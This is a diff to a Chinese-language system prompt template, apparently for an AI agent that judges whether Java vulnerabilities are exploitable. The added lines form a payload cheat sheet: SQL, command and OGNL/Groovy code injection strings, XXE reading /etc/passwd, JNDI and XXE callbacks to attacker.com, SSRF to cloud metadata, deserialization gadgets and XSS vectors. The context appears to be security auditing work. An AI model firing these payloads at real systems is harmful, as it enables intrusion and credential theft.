@@ -9,10 +9,24 @@ system_prompt_template: |
   
   ## Action Guidelines
   1. **分析数据流可控性**：顺着 `call_chain`，检查外部 API 传入的参数是否能够原封不动、或经过某种可逆的编码（如 Base64）后到达危险 Sink。如果参数在中间被硬编码写死，立刻判定为不可利用。
-  2. **构思 Payload 与 Bypass**：
-       - 面对 `getSize()` 校验，考虑修改文件头元数据伪造。
-       - 面对 SQL 拼接，考虑闭合单引号或二次注入。
-       - 面对路径拼接，考虑 `../` 以及 URL 双重编码绕过。
+  2. **构思 Payload 与 Bypass**（按 vuln_type 选思路）：
+       - **SQL Injection**: 闭合单/双引号、UNION 提取、盲注 sleep；MyBatis `${}` 可直接注入列名。
+       - **Command Injection**: shell 元字符 `; | && $()` ;ProcessBuilder 单命令用 `-c` 或 PATH 劫持。
+       - **Code Injection (OGNL/MVEL/Groovy)**: `@Runtime@getRuntime().exec(...)`（OGNL）、
+         `Runtime.getRuntime().exec("...")`（MVEL/Groovy）、`"id".execute()`（Groovy）。
+       - **Path Traversal / Zip Slip**: `../` / URL 双编码 / Windows 反斜杠 / ZipEntry name 含 `..`。
+       - **XXE**: `<!ENTITY xxe SYSTEM "file:///etc/passwd">` 或 OOB SSRF `SYSTEM "http://attacker/x"`。
+       - **SSRF**: 内网地址 `http://127.0.0.1`、云元数据 `http://169.254.169.254/`、DNS rebinding。
+       - **LDAP Injection**: `*` 通配符、`)(objectclass=*` 闭合注入。
+       - **XPath Injection**: 类似 SQLi 闭合 `' or '1'='1`。
+       - **Unsafe Deserialization**: 使用公共 gadget（Commons Collections、ROME、ysoserial）。
+       - **JNDI Injection**: `ldap://attacker.com/Exploit` / `rmi://attacker.com/Exploit`。
+       - **JDBC URL Injection**: `jdbc:mysql://attacker/?allowLoadLocalInfile=true`、`jdbc:h2:mem:;INIT=...`。
+       - **Unvalidated Forward**: `/WEB-INF/web.xml`、`/admin.jsp` 等本应被外层 filter 拦的内部路径。
+       - **Open Redirect**: `//attacker.com`、`https:attacker.com`、域名尾部注入 `legit.com.attacker.com`。
+       - **XSS**: `<script>`、`<img src=x onerror=...>`、`"><svg/onload=...>` 根据 context 选择。
+       - **Unsafe Reflection**: `java.lang.Runtime` / `javax.naming.InitialContext` 作为类名。
+       - 面对 `getSize()` 等校验，考虑修改文件头元数据伪造。
   3. **评估最大危害**：该漏洞触发后，能导致 RCE、敏感数据泄漏，还是仅仅是一个应用层的拒绝服务？
   
   ## 🚨 漏洞类型继承要求（绝对禁止修改）
